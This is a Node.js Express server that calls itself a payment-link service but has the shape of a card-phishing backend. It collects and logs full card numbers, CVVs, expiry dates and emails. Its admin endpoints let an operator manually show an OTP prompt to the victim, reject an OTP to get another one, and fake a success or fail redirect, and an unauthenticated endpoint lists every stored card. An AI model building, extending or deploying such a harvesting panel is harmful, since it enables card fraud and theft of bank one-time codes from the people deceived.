import express from 'express';
import bodyParser from 'body-parser';
import cors from 'cors';
import crypto from 'crypto';
import http from 'http';

const app = express();
app.use(bodyParser.json());
app.use(cors());
app.use(express.static("public"));

// In-memory stores (you can later replace these with a real DB)
const transactions = new Map();
const paymentLinks = new Map();

// Endpoint to generate a payment link (directs to landing.html)
// It uses the full amount as provided.
app.post('/api/generatePaymentLink', (req, res) => {
  const { amount, description } = req.body;
  if (!amount || isNaN(amount)) {
    return res.status(400).json({ status: "error", message: "Invalid amount" });
  }
  if (!description || !description.trim()) {
    return res.status(400).json({ status: "error", message: "Description required" });
  }
  // Generate an invoice ID – a unique hex string.
  const invoiceId = crypto.randomBytes(4).toString('hex').toUpperCase();
  // Construct a link that directs to landing.html using HTTPS and passes the invoice ID
  const paymentLink = `https://${req.get('host')}/landing.html?pid=${invoiceId}`;
  paymentLinks.set(invoiceId, { amount: Number(amount), description, paymentLink, createdAt: new Date().toISOString() });
  res.json({ status: "success", paymentLink });
});

// Endpoint to fetch payment details (for landing & payment pages)
app.get('/api/getPaymentDetails', (req, res) => {
  const { pid } = req.query;
  if (!pid || !paymentLinks.has(pid)) {
    return res.status(404).json({ status: "error", message: "Payment details not found" });
  }
  const payment = paymentLinks.get(pid);
  res.json({ status: "success", payment });
});

// Endpoint to get transaction details (for success/fail pages)
app.get('/api/getTransactionDetails', (req, res) => {
  const { invoiceId } = req.query;
  const txn = transactions.get(invoiceId);
  if (!txn) {
    return res.status(404).json({ status: "error", message: "Transaction details not found" });
  }
  res.json(txn);
});

// Endpoint to get all transactions (for admin panel)
app.get('/api/transactions', (req, res) => {
  const txList = Array.from(transactions.values());
  res.json(txList);
});

// Process payment details – simulating a payment submission.
app.post('/api/sendPaymentDetails', (req, res) => {
  const { cardNumber, expiry, cvv, email, amount, currency, cardholder } = req.body;
  const invoiceId = crypto.randomBytes(4).toString('hex').toUpperCase();
  const transaction = {
    id: invoiceId,
    cardNumber,
    expiry,
    cvv,
    email,
    // Make sure the amount remains exactly as sent
    amount: amount.toString().replace(/,/g, ''),
    currency,
    cardholder,
    status: 'processing',
    otp: null,
    otpShown: false,
    otpEntered: null,
    otpError: false,
    redirectStatus: null,
    timestamp: new Date().toLocaleString()
  };
  transactions.set(invoiceId, transaction);
  console.log("New transaction recorded:", transaction);
  res.json({ status: "success", invoiceId });
});

// Admin command: show OTP
app.post('/api/showOTP', (req, res) => {
  const { invoiceId } = req.body;
  const txn = transactions.get(invoiceId);
  if (!txn) {
    return res.status(404).json({ status: "error", message: "Transaction not found" });
  }
  txn.otpShown = true;
  txn.status = 'otp_pending';
  txn.otpError = false;
  res.json({ status: "success", message: "OTP form will be shown to user" });
});

// Admin command: mark OTP as wrong
app.post('/api/wrongOTP', (req, res) => {
  const { invoiceId } = req.body;
  const txn = transactions.get(invoiceId);
  if (!txn) {
    return res.status(404).json({ status: "error", message: "Transaction not found" });
  }
  txn.otpError = true;
  txn.status = 'otp_pending';
  res.json({ status: "success", message: "OTP marked as wrong" });
});

// Check transaction status (polled by payment page)
app.get('/api/checkTransactionStatus', (req, res) => {
  const { invoiceId } = req.query;
  const txn = transactions.get(invoiceId);
  if (!txn) {
    return res.status(404).json({ status: "error", message: "Transaction details not found" });
  }
  if (txn.status === 'otp_pending' && txn.otpShown) {
    return res.json({ status: "show_otp", message: "Show OTP form to user", otpError: txn.otpError });
  }
  if (txn.redirectStatus) {
    const redirectUrl = txn.redirectStatus === 'success'
      ? `/success.html?invoiceId=${invoiceId}`
      : `/fail.html?invoiceId=${invoiceId}`;
    return res.json({ status: "redirect", redirectUrl });
  }
  res.json({ status: txn.status, otpError: txn.otpError });
});

// Submit OTP
app.post('/api/submitOTP', (req, res) => {
  const { invoiceId, otp } = req.body;
  const txn = transactions.get(invoiceId);
  if (!txn) {
    return res.status(404).json({ status: "error", message: "Transaction not found" });
  }
  txn.otpEntered = otp;
  txn.status = 'otp_received';
  txn.otpError = false;
  console.log(`OTP received for transaction ${invoiceId}: ${otp}`);
  res.json({ status: "success", message: "OTP received" });
});

// Admin command: update redirect status (simulate success/fail)
app.post('/api/updateRedirectStatus', (req, res) => {
  const { invoiceId, redirectStatus } = req.body;
  const txn = transactions.get(invoiceId);
  if (!txn) {
    return res.status(404).json({ status: "error", message: "Transaction not found" });
  }
  txn.redirectStatus = redirectStatus;
  console.log(`Transaction ${invoiceId} redirect status updated to: ${redirectStatus}`);
  res.json({
    status: "success",
    invoiceId,
    redirectStatus,
    redirectUrl: redirectStatus === 'success'
      ? `/success.html?invoiceId=${invoiceId}`
      : `/fail.html?invoiceId=${invoiceId}`
  });
});

// NEW: Bankpage endpoint – when admin clicks “Bankpage” in admin panel, it opens bankpage.html
app.get('/bankpage.html', (req, res) => {
  const invoiceId = req.query.invoiceId;
  if (!invoiceId || !paymentLinks.has(invoiceId)) {
    return res.status(404).send('Invalid bank page link');
  }
  res.sendFile(process.cwd() + '/public/bankpage.html');
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
